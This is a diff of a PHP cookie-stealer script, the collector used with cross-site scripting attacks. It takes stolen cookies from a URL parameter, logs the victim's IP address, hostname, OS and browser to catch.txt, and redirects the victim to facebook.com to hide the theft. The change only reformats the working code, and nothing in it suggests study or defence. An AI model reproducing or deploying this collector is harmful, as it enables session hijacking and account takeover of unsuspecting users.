@@ -1,34 +1,22 @@
 <?php
-header ('Location:https://www.facebook.com');
+	header ('Location:https://www.facebook.com');
 	$cookies = $_GET["c"];
-    
-    //whether ip is from share internet
-if (!empty($_SERVER['HTTP_CLIENT_IP']))   
-  {
-    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
-  }
-//whether ip is from proxy
-elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  
-  {
-    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
-  }
-//whether ip is from remote address
-else
-  {
-    $ip_address = $_SERVER['REMOTE_ADDR'];
-  }
 
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
+	if (!empty($_SERVER['HTTP_CLIENT_IP'])){
+		$ip_address = $_SERVER['HTTP_CLIENT_IP'];
+	} else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
+		$ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
+	} else {
+		$ip_address = $_SERVER['REMOTE_ADDR'];
+	}
 
-$localIP = getHostByName(getHostName());
+	$user_agent = $_SERVER['HTTP_USER_AGENT'];
+	$hostname = getHostByName(getHostName());
 
-function getOS() { 
-
-    global $user_agent;
-
-    $os_platform  = "Unknown OS Platform";
-
-    $os_array     = array(
+	function getOS() { 
+		global $user_agent;
+		$os_platform  = "Unknown OS Platform";
+		$os_array     = array(
                           '/windows nt 10/i'      =>  'Windows 10',
                           '/windows nt 6.3/i'     =>  'Windows 8.1',
                           '/windows nt 6.2/i'     =>  'Windows 8',
@@ -51,23 +39,19 @@ function getOS() {
                           '/ipad/i'               =>  'iPad',
                           '/android/i'            =>  'Android',
                           '/blackberry/i'         =>  'BlackBerry',
-                          '/webos/i'              =>  'Mobile'
-                    );
+                          '/webos/i'              =>  'Mobile');
+		
+		foreach ($os_array as $regex => $value)
+			if (preg_match($regex, $user_agent))
+				$os_platform = $value;
+				return $os_platform;
+	}
 
-    foreach ($os_array as $regex => $value)
-        if (preg_match($regex, $user_agent))
-            $os_platform = $value;
-
-    return $os_platform;
-}
-
-function getBrowser() {
-
-    global $user_agent;
-
-    $browser        = "Unknown Browser";
-
-    $browser_array = array(
+	function getBrowser() {
+		global $user_agent;
+		
+		$browser = "Unknown Browser";
+		$browser_array = array(
                             '/msie/i'      => 'Internet Explorer',
                             '/firefox/i'   => 'Firefox',
                             '/safari/i'    => 'Safari',
@@ -77,21 +61,19 @@ function getBrowser() {
                             '/netscape/i'  => 'Netscape',
                             '/maxthon/i'   => 'Maxthon',
                             '/konqueror/i' => 'Konqueror',
-                            '/mobile/i'    => 'Handheld Browser'
-                     );
+                            '/mobile/i'    => 'Handheld Browser');
+		
+		foreach ($browser_array as $regex => $value)
+			if (preg_match($regex, $user_agent))
+				$browser = $value;
+				return $browser;
+	}
 
-    foreach ($browser_array as $regex => $value)
-        if (preg_match($regex, $user_agent))
-            $browser = $value;
+	$user_os = getOS();
+	$user_browser = getBrowser();
 
-    return $browser;
-}
-
-$user_os        = getOS();
-$user_browser   = getBrowser();
-
-$device_details = "$user_browser, $user_os";
+	$device_details = "$user_browser, $user_os";
     
 	$file = fopen('catch.txt', 'a');
-    fwrite($file, $cookies . "\n\nExternal IP Address: " . $ip_address . "\n\nLocal IP Address/Webhost: " . $localIP . "\n\nDevice Details: " . $device_details);
-	?>
+	fwrite($file, $cookies . "\n\nExternal IP Address: " . $ip_address . "\n\nLocal IP Address/Webhost: " . $hostname . "\n\nDevice Details: " . $device_details);
+?>
